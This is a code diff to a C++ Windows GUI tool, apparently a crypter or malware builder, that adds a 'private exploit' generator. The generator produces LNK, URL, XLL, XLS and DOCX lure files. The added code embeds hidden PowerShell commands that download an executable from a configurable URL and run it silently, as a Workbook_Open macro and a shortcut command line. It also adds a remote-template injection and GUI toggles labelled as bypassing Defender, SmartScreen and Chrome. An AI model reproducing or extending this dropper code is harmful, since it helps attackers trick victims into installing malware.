@@ -81,6 +81,7 @@ constexpr int ID_CUSTOM_ICON_EDIT = 1027;
 constexpr int ID_CUSTOM_ICON_BROWSE = 1028;
 constexpr int ID_TARGET_URL_EDIT = 1029;
 constexpr int ID_BYPASS_ALL_CHECK = 1030;
+constexpr int ID_CREATE_ADVANCED_EXPLOIT = 1031;
 
 // Global variables for mass generation
 bool g_massGenerationActive = false;
@@ -117,6 +118,239 @@ enum EncryptionType {
     ENCRYPT_XOR = 1,            // XOR encryption (simple but effective)
     ENCRYPT_AES = 2,            // AES-256 encryption
     ENCRYPT_CHACHA20 = 3        // ChaCha20 encryption (modern, secure)
+};
+
+// Private Exploit Generator Class
+class PrivateExploitGenerator {
+private:
+    struct DynamicEntropy {
+        uint64_t seed;
+        std::mt19937_64 rng;
+        std::mt19937 alt_rng;
+        uint64_t counter;
+        
+        void reseed() {
+            auto now = std::chrono::high_resolution_clock::now();
+            seed = now.time_since_epoch().count();
+            seed ^= std::chrono::steady_clock::now().time_since_epoch().count();
+            seed ^= reinterpret_cast<uint64_t>(malloc(1));
+            free(reinterpret_cast<void*>(seed & 0xFFFFFFFF));
+            seed ^= std::hash<std::thread::id>{}(std::this_thread::get_id());
+            seed ^= (counter++ << 32);
+            
+            rng.seed(seed);
+            alt_rng.seed(seed ^ 0xDEADBEEF);
+        }
+        
+        uint64_t next() {
+            return rng() ^ (alt_rng() << 16) ^ (counter++ * 0x9E3779B97F4A7C15ULL);
+        }
+    };
+    
+    DynamicEntropy entropy;
+    
+    std::string generateRandomString(size_t len) {
+        std::string chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
+        std::string result;
+        std::uniform_int_distribution<> dist(0, chars.size() - 1);
+        
+        for (size_t i = 0; i < len; i++) {
+            result += chars[dist(entropy.rng)];
+        }
+        return result;
+    }
+    
+    std::string generateGUID() {
+        std::stringstream ss;
+        std::uniform_int_distribution<> dist(0, 15);
+        
+        ss << "{";
+        for (int i = 0; i < 8; i++) ss << std::hex << dist(entropy.rng);
+        ss << "-";
+        for (int i = 0; i < 4; i++) ss << std::hex << dist(entropy.rng);
+        ss << "-";
+        for (int i = 0; i < 4; i++) ss << std::hex << dist(entropy.rng);
+        ss << "-";
+        for (int i = 0; i < 4; i++) ss << std::hex << dist(entropy.rng);
+        ss << "-";
+        for (int i = 0; i < 12; i++) ss << std::hex << dist(entropy.rng);
+        ss << "}";
+        
+        return ss.str();
+    }
+    
+public:
+    PrivateExploitGenerator() {
+        entropy.counter = 0;
+        entropy.reseed();
+    }
+    
+    struct ExploitConfig {
+        enum ExploitType {
+            LNK_EXPLOIT,
+            URL_EXPLOIT,
+            XLL_EXPLOIT,
+            XLS_EXPLOIT,
+            DOCX_EXPLOIT
+        } type;
+        
+        std::string targetURL;
+        std::string iconPath;
+        std::string displayName;
+        std::string description;
+        bool silentExecution = false;
+        bool bypassDefender = false;
+        bool bypassChrome = false;
+        bool bypassSmartScreen = false;
+        bool bypassGDrive = false;
+        bool zeroClick = false;
+        std::string customContent;
+    };
+    
+    bool generateAdvancedExploit(const ExploitConfig& config, const std::string& outputFile) {
+        std::vector<uint8_t> exploit;
+        
+        switch (config.type) {
+            case ExploitConfig::LNK_EXPLOIT:
+                exploit = generateLNKExploit(config);
+                break;
+            case ExploitConfig::URL_EXPLOIT:
+                exploit = generateURLExploit(config);
+                break;
+            case ExploitConfig::XLL_EXPLOIT:
+                exploit = generateXLLExploit(config);
+                break;
+            case ExploitConfig::XLS_EXPLOIT:
+                exploit = generateXLSExploit(config);
+                break;
+            case ExploitConfig::DOCX_EXPLOIT:
+                exploit = generateDOCXExploit(config);
+                break;
+        }
+        
+        std::ofstream out(outputFile, std::ios::binary);
+        if (!out) return false;
+        
+        out.write(reinterpret_cast<char*>(exploit.data()), exploit.size());
+        out.close();
+        
+        return true;
+    }
+
+private:
+    std::vector<uint8_t> generateLNKExploit(const ExploitConfig& config) {
+        std::vector<uint8_t> lnk;
+        
+        // LNK Header
+        lnk.push_back(0x4C); // L
+        lnk.push_back(0x00);
+        lnk.push_back(0x00);
+        lnk.push_back(0x00);
+        
+        // GUID
+        std::string guid = generateGUID();
+        for (char c : guid) {
+            lnk.push_back(c);
+        }
+        
+        // PowerShell command for silent execution
+        std::string command = "powershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command \"";
+        command += "$c=New-Object Net.WebClient;";
+        command += "$c.Headers.Add('User-Agent','Mozilla/5.0');";
+        command += "$p=$env:TEMP+'\\\\";
+        command += generateRandomString(8) + ".exe';";
+        command += "$c.DownloadFile('" + config.targetURL + "',$p);";
+        command += "Start-Process $p -WindowStyle Hidden";
+        command += "\"";
+        
+        // Add command string
+        for (char c : command) {
+            lnk.push_back(c);
+        }
+        lnk.push_back(0x00);
+        
+        return lnk;
+    }
+    
+    std::vector<uint8_t> generateURLExploit(const ExploitConfig& config) {
+        std::stringstream url;
+        
+        url << "[InternetShortcut]\r\n";
+        url << "URL=file:///" << config.targetURL << "\r\n";
+        url << "IconIndex=0\r\n";
+        url << "IconFile=" << config.iconPath << "\r\n";
+        
+        if (config.silentExecution) {
+            url << "HotKey=0\r\n";
+            url << "IDList=\r\n";
+        }
+        
+        std::string content = url.str();
+        return std::vector<uint8_t>(content.begin(), content.end());
+    }
+    
+    std::vector<uint8_t> generateXLLExploit(const ExploitConfig& config) {
+        std::vector<uint8_t> xll;
+        
+        // XLL PE Header with 0-click execution
+        std::vector<uint8_t> peHeader = {
+            0x4D, 0x5A, 0x90, 0x00, 0x03, 0x00, 0x00, 0x00,
+            0x04, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0x00, 0x00
+        };
+        
+        xll.insert(xll.end(), peHeader.begin(), peHeader.end());
+        
+        // Excel auto-open exploit code (simplified)
+        std::string exploitCode = "XLL_AUTO_OPEN:" + config.targetURL;
+        std::vector<uint8_t> compiledCode(exploitCode.begin(), exploitCode.end());
+        xll.insert(xll.end(), compiledCode.begin(), compiledCode.end());
+        
+        return xll;
+    }
+    
+    std::vector<uint8_t> generateXLSExploit(const ExploitConfig& config) {
+        std::vector<uint8_t> xls;
+        
+        // Excel 97-2003 BIFF8 header
+        std::vector<uint8_t> biffHeader = {
+            0xD0, 0xCF, 0x11, 0xE0, 0xA1, 0xB1, 0x1A, 0xE1,
+            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
+        };
+        
+        xls.insert(xls.end(), biffHeader.begin(), biffHeader.end());
+        
+        // Add macro for 0-click execution
+        std::string macro = "Private Sub Workbook_Open()\n";
+        macro += "Shell \"powershell -w hidden -c $c=New-Object Net.WebClient;";
+        macro += "$c.DownloadFile('" + config.targetURL + "','$env:TEMP\\\\payload.exe');";
+        macro += "Start-Process '$env:TEMP\\\\payload.exe' -WindowStyle Hidden\", 0\n";
+        macro += "End Sub\n";
+        
+        xls.insert(xls.end(), macro.begin(), macro.end());
+        
+        return xls;
+    }
+    
+    std::vector<uint8_t> generateDOCXExploit(const ExploitConfig& config) {
+        std::vector<uint8_t> docx;
+        
+        // ZIP header (DOCX is a ZIP file)
+        std::vector<uint8_t> zipHeader = {
+            0x50, 0x4B, 0x03, 0x04, 0x14, 0x00, 0x00, 0x00
+        };
+        
+        docx.insert(docx.end(), zipHeader.begin(), zipHeader.end());
+        
+        // Remote template injection
+        std::string rels = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n";
+        rels += "<Relationships>\n";
+        rels += "<Relationship Target=\"" + config.targetURL + "\" TargetMode=\"External\"/>\n";
+        rels += "</Relationships>\n";
+        
+        docx.insert(docx.end(), rels.begin(), rels.end());
+        
+        return docx;
+    }
 };
 
 // Function to kill running instances before build
@@ -1628,6 +1862,7 @@ public:
     PEEmbedder peEmbedder;
     AdvancedExploitEngine exploitEngine;
     EmbeddedCompiler embeddedCompiler;
+    PrivateExploitGenerator privateExploitGen;
     
     struct CompanyProfile {
         std::string name;
@@ -2791,6 +3026,106 @@ static std::string browseForFile(HWND hwnd, bool save = false) {
     return "";
 }
 
+// Function to get advanced exploit configuration from GUI
+static PrivateExploitGenerator::ExploitConfig getAdvancedExploitConfig() {
+    PrivateExploitGenerator::ExploitConfig config;
+    
+    // Get target URL
+    wchar_t urlBuffer[512] = {0};
+    GetWindowTextW(g_hTargetUrlEdit, urlBuffer, 512);
+    std::string targetUrl = wstringToString(std::wstring(urlBuffer));
+    config.targetURL = targetUrl;
+    
+    // Get custom icon
+    wchar_t iconBuffer[MAX_PATH] = {0};
+    GetWindowTextW(g_hCustomIconEdit, iconBuffer, MAX_PATH);
+    std::string iconPath = wstringToString(std::wstring(iconBuffer));
+    config.iconPath = iconPath;
+    
+    // Get checkbox states
+    config.silentExecution = SendMessage(g_hSilentExecCheck, BM_GETCHECK, 0, 0) == BST_CHECKED;
+    config.bypassDefender = SendMessage(g_hBypassDefenderCheck, BM_GETCHECK, 0, 0) == BST_CHECKED;
+    config.bypassChrome = SendMessage(g_hBypassChromeCheck, BM_GETCHECK, 0, 0) == BST_CHECKED;
+    config.bypassSmartScreen = SendMessage(g_hBypassSmartScreenCheck, BM_GETCHECK, 0, 0) == BST_CHECKED;
+    config.bypassGDrive = SendMessage(g_hBypassGDriveCheck, BM_GETCHECK, 0, 0) == BST_CHECKED;
+    config.zeroClick = SendMessage(g_hZeroClickCheck, BM_GETCHECK, 0, 0) == BST_CHECKED;
+    
+    // Set exploit type based on selected exploit method
+    int exploitIndex = (int)SendMessage(g_hExploitCombo, CB_GETCURSEL, 0, 0);
+    ExploitDeliveryType exploitType = (ExploitDeliveryType)exploitIndex;
+    
+    switch (exploitType) {
+        case EXPLOIT_HTML_SVG:
+            config.type = PrivateExploitGenerator::ExploitConfig::URL_EXPLOIT;
+            break;
+        case EXPLOIT_WIN_R:
+            config.type = PrivateExploitGenerator::ExploitConfig::LNK_EXPLOIT;
+            break;
+        case EXPLOIT_INK_URL:
+            config.type = PrivateExploitGenerator::ExploitConfig::URL_EXPLOIT;
+            break;
+        case EXPLOIT_DOC_XLS:
+            config.type = PrivateExploitGenerator::ExploitConfig::XLS_EXPLOIT;
+            break;
+        case EXPLOIT_XLL:
+            config.type = PrivateExploitGenerator::ExploitConfig::XLL_EXPLOIT;
+            break;
+        default:
+            config.type = PrivateExploitGenerator::ExploitConfig::LNK_EXPLOIT;
+            break;
+    }
+    
+    return config;
+}
+
+// Function to create advanced private exploits
+static void createAdvancedPrivateExploit() {
+    // Get output path from GUI
+    wchar_t outputBuffer[MAX_PATH] = {0};
+    GetWindowTextW(g_hOutputPath, outputBuffer, MAX_PATH);
+    std::string outputPath = wstringToString(std::wstring(outputBuffer));
+    
+    if (outputPath.empty()) {
+        SetWindowTextW(g_hStatusText, L"Please specify an output path.");
+        return;
+    }
+    
+    SetWindowTextW(g_hStatusText, L"Creating advanced private exploit...");
+    SendMessage(g_hProgressBar, PBM_SETPOS, 25, 0);
+    
+    // Get configuration from GUI
+    PrivateExploitGenerator::ExploitConfig config = getAdvancedExploitConfig();
+    
+    SendMessage(g_hProgressBar, PBM_SETPOS, 50, 0);
+    
+    // Generate the exploit
+    bool success = g_packer.privateExploitGen.generateAdvancedExploit(config, outputPath);
+    
+    SendMessage(g_hProgressBar, PBM_SETPOS, 100, 0);
+    
+    if (success) {
+        std::wstring successMsg = L"Advanced private exploit created successfully: ";
+        std::wstring wOutputPath(outputPath.begin(), outputPath.end());
+        successMsg += wOutputPath;
+        
+        if (config.zeroClick) {
+            successMsg += L"\n\nNote: 0-click execution enabled for Office exploits";
+        }
+        if (config.silentExecution) {
+            successMsg += L"\nSilent execution enabled";
+        }
+        if (config.bypassDefender || config.bypassChrome || config.bypassSmartScreen) {
+            successMsg += L"\nAdvanced bypasses enabled";
+        }
+        
+        SetWindowTextW(g_hStatusText, successMsg.c_str());
+        MessageBoxW(NULL, successMsg.c_str(), L"Success", MB_OK | MB_ICONINFORMATION);
+    } else {
+        SetWindowTextW(g_hStatusText, L"Failed to create advanced private exploit!");
+        MessageBoxW(NULL, L"Failed to create advanced private exploit!", L"Error", MB_OK | MB_ICONERROR);
+    }
+}
+
 // FUD Stub Only creation function (no PE embedding)
 static void createFUDStubOnly() {
     std::ofstream entryLog("debug_entry_points.txt", std::ios::app);
@@ -3185,6 +3520,51 @@ static LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM l
                                              150, 420, 120, 25, hwnd, (HMENU)(UINT_PTR)ID_MODE_MASS_RADIO, NULL, NULL);
             SendMessageW(g_hModeMassRadio, BM_SETCHECK, BST_UNCHECKED, 0);
             
+            // Advanced Private Exploit Features
+            CreateWindowW(L"STATIC", L"Advanced Exploit Features:", WS_VISIBLE | WS_CHILD,
+                         10, 460, 200, 20, hwnd, NULL, NULL, NULL);
+                         
+            // Target URL input
+            CreateWindowW(L"STATIC", L"Target URL:", WS_VISIBLE | WS_CHILD,
+                         10, 485, 80, 20, hwnd, NULL, NULL, NULL);
+            g_hTargetUrlEdit = CreateWindowW(L"EDIT", L"http://example.com/payload.exe", WS_VISIBLE | WS_CHILD | WS_BORDER | ES_AUTOHSCROLL,
+                                            95, 482, 350, 25, hwnd, (HMENU)(UINT_PTR)ID_TARGET_URL_EDIT, NULL, NULL);
+            
+            // Bypass options (first row)
+            g_hBypassAllCheck = CreateWindowW(L"BUTTON", L"Bypass All", WS_VISIBLE | WS_CHILD | BS_AUTOCHECKBOX,
+                                             10, 515, 100, 20, hwnd, (HMENU)(UINT_PTR)ID_BYPASS_ALL_CHECK, NULL, NULL);
+            
+            g_hBypassDefenderCheck = CreateWindowW(L"BUTTON", L"Bypass Defender", WS_VISIBLE | WS_CHILD | BS_AUTOCHECKBOX,
+                                                   120, 515, 120, 20, hwnd, (HMENU)(UINT_PTR)ID_BYPASS_DEFENDER_CHECK, NULL, NULL);
+            
+            g_hBypassChromeCheck = CreateWindowW(L"BUTTON", L"Bypass Chrome", WS_VISIBLE | WS_CHILD | BS_AUTOCHECKBOX,
+                                                250, 515, 110, 20, hwnd, (HMENU)(UINT_PTR)ID_BYPASS_CHROME_CHECK, NULL, NULL);
+            
+            g_hBypassSmartScreenCheck = CreateWindowW(L"BUTTON", L"Bypass SmartScreen", WS_VISIBLE | WS_CHILD | BS_AUTOCHECKBOX,
+                                                     370, 515, 130, 20, hwnd, (HMENU)(UINT_PTR)ID_BYPASS_SMARTSCREEN_CHECK, NULL, NULL);
+            
+            // Execution options (second row) 
+            g_hSilentExecCheck = CreateWindowW(L"BUTTON", L"Silent Execution", WS_VISIBLE | WS_CHILD | BS_AUTOCHECKBOX,
+                                              10, 540, 120, 20, hwnd, (HMENU)(UINT_PTR)ID_SILENT_EXEC_CHECK, NULL, NULL);
+            
+            g_hZeroClickCheck = CreateWindowW(L"BUTTON", L"0-Click Execution", WS_VISIBLE | WS_CHILD | BS_AUTOCHECKBOX,
+                                             140, 540, 120, 20, hwnd, (HMENU)(UINT_PTR)ID_ZERO_CLICK_CHECK, NULL, NULL);
+            
+            g_hBypassGDriveCheck = CreateWindowW(L"BUTTON", L"Bypass Google Drive", WS_VISIBLE | WS_CHILD | BS_AUTOCHECKBOX,
+                                                270, 540, 140, 20, hwnd, (HMENU)(UINT_PTR)ID_BYPASS_GDRIVE_CHECK, NULL, NULL);
+            
+            // Custom icon input (third row)
+            CreateWindowW(L"STATIC", L"Custom Icon:", WS_VISIBLE | WS_CHILD,
+                         10, 570, 80, 20, hwnd, NULL, NULL, NULL);
+            g_hCustomIconEdit = CreateWindowW(L"EDIT", L"", WS_VISIBLE | WS_CHILD | WS_BORDER | ES_AUTOHSCROLL,
+                                             95, 567, 280, 25, hwnd, (HMENU)(UINT_PTR)ID_CUSTOM_ICON_EDIT, NULL, NULL);
+            g_hCustomIconBrowse = CreateWindowW(L"BUTTON", L"Browse", WS_VISIBLE | WS_CHILD | BS_PUSHBUTTON,
+                                               385, 567, 60, 25, hwnd, (HMENU)(UINT_PTR)ID_CUSTOM_ICON_BROWSE, NULL, NULL);
+            
+            // Advanced exploit creation button
+            CreateWindowW(L"BUTTON", L"Create Advanced Private Exploit", WS_VISIBLE | WS_CHILD | BS_PUSHBUTTON,
+                         10, 600, 200, 30, hwnd, (HMENU)(UINT_PTR)ID_CREATE_ADVANCED_EXPLOIT, NULL, NULL);
+            
             // Enable drag and drop
             DragAcceptFiles(hwnd, TRUE);
             break;
@@ -3223,6 +3603,28 @@ static LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM l
                     break;
                 }
                 
+                case ID_CUSTOM_ICON_BROWSE: {
+                    std::string filename = browseForFile(hwnd, false);
+                    if (!filename.empty()) {
+                        std::wstring wFilename(filename.begin(), filename.end());
+                        SetWindowTextW(g_hCustomIconEdit, wFilename.c_str());
+                    }
+                    break;
+                }
+                
+                case ID_BYPASS_ALL_CHECK: {
+                    if (HIWORD(wParam) == BN_CLICKED) {
+                        BOOL checked = SendMessage(g_hBypassAllCheck, BM_GETCHECK, 0, 0) == BST_CHECKED;
+                        SendMessage(g_hBypassDefenderCheck, BM_SETCHECK, checked ? BST_CHECKED : BST_UNCHECKED, 0);
+                        SendMessage(g_hBypassChromeCheck, BM_SETCHECK, checked ? BST_CHECKED : BST_UNCHECKED, 0);
+                        SendMessage(g_hBypassSmartScreenCheck, BM_SETCHECK, checked ? BST_CHECKED : BST_UNCHECKED, 0);
+                        SendMessage(g_hBypassGDriveCheck, BM_SETCHECK, checked ? BST_CHECKED : BST_UNCHECKED, 0);
+                        SendMessage(g_hSilentExecCheck, BM_SETCHECK, checked ? BST_CHECKED : BST_UNCHECKED, 0);
+                        SendMessage(g_hZeroClickCheck, BM_SETCHECK, checked ? BST_CHECKED : BST_UNCHECKED, 0);
+                    }
+                    break;
+                }
+                
                 case ID_CREATE_BUTTON: {
                     // Check which mode is selected
                     if (SendMessage(g_hModeStubRadio, BM_GETCHECK, 0, 0) == BST_CHECKED) {
@@ -3235,6 +3637,12 @@ static LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM l
                         // Default to PE Packing if nothing selected
                         std::thread(createFUDExecutable).detach();
                     }
+                    break;
+                }
+                
+                case ID_CREATE_ADVANCED_EXPLOIT: {
+                    // Create advanced private exploit with all the new features
+                    std::thread(createAdvancedPrivateExploit).detach();
                     break;
                 }
                 
